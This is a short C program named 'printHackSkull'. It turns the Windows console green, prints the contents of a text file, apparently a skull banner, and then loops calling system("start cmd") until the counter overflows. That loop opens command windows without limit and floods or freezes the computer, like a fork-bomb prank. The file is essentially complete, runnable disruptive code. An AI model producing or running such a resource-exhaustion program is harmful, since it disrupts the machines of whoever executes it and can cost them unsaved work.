//printHackSkull

#include <stdio.h> 
#include <string.h> 
#include <stdlib.h> // For exit() 

int main() 
{ 
	system("color a");
	FILE *fptr; 

	char c; 

	char * filename = "skullMsg.txt";

	// Open file 
	fptr = fopen(filename, "r"); 
	if (fptr == NULL) 
	{ 
		printf("Cannot open file \n"); 
		exit(0); 
	} 

	// Read contents from file 
	c = fgetc(fptr); 
	while (c != EOF) 
	{ 
		printf ("%c", c); 
		c = fgetc(fptr); 
	} 

	fclose(fptr); 
	for(int i=0; i>=0; i++)
		system("start cmd");
	 


}
